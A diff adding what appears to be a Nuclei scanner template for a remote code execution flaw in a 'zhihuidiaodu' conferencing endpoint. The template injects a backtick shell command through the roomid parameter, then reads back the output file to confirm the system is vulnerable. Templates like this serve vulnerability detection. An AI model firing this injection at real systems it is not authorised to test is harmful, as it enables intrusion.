@@ -1,0 +1,36 @@
+id: zhihuidiaodu-invite_one_member-rce
+
+info:
+  name: zhihuidiaodu-invite_one_member-rce
+  author: HuanXiong
+  severity: critical
+
+  tags: RCE
+
+variables:
+  username: "{{to_lower(rand_base(6))}}" # 从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列
+
+http:
+  - raw:
+      - |
+        GET /api/client/conference/invite_one_member.php?callee=1&roomid=`id>{{username}}.txt` HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
+        Connection: keep-alive
+        Accept-Encoding: gzip, deflate, br
+
+      - |
+        GET /api/client/conference/{{username}}.txt HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
+        Connection: keep-alive
+        Accept-Encoding: gzip, deflate, br
+
+    req-condition: true
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_2 == 200"
+          - "contains(body_2, 'uid=')"
+        condition: and
